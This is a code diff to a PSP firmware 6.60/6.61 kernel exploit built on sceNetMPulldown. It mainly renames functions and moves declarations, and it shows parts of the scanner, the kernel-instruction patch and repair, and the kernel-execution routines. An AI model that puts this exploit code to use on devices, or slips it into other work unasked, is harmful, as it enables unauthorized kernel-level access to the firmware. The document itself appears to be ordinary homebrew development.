@@ -59,10 +59,6 @@ sceNetMPulldown Kernel Exploit for PSP 6.60 and 6.61
 #define PATCH_ADDR SYSMEM_TEXT_ADDR+PATCH_OFFSET // exact address of patch
 #define PATCHED_INST 0x3C058801 // the original instruction
 
-UserFunctions* g_tbl;
-
-struct MPulldownExploit;
-int (* _sceNetMPulldown)(struct MPulldownExploit *data, int unk1, int unk2, int unk3);
 
 struct MPulldownExploit {
     u32 *data; // unk_data
@@ -71,19 +67,20 @@ struct MPulldownExploit {
     int target_size;
     u32 unk_data[80]; // embeeded it
 };
+static int (* _sceNetMPulldown)(struct MPulldownExploit *data, int unk1, int unk2, int unk3);
 
-int stubScanner(UserFunctions* tbl){
+int stubScanner660(UserFunctions* tbl){
     g_tbl = tbl;
     for (int i=0; i<7; i++) g_tbl->UtilityLoadModule(0x100+i);
     _sceNetMPulldown = g_tbl->FindImportUserRam("sceNetIfhandle_lib", 0xE80F00A4);
     return (_sceNetMPulldown==NULL);
 }
 
-void repairInstruction(KernelFunctions* k_tbl){
+void repairInstruction660(KernelFunctions* k_tbl){
     _sw(PATCHED_INST, PATCH_ADDR);
 }
 
-int doExploit(void){
+int doExploit660(void){
     struct MPulldownExploit *ptr;
     int ret;
     u32 interrupts;
@@ -108,7 +105,7 @@ int doExploit(void){
     return 0;
 }
 
-void executeKernel(u32 kfuncaddr){
+void executeKernel660(u32 kfuncaddr){
     u32 kernel_entry, entry_addr;
     kernel_entry = kfuncaddr;
     entry_addr = ((u32) &kernel_entry) - 16;
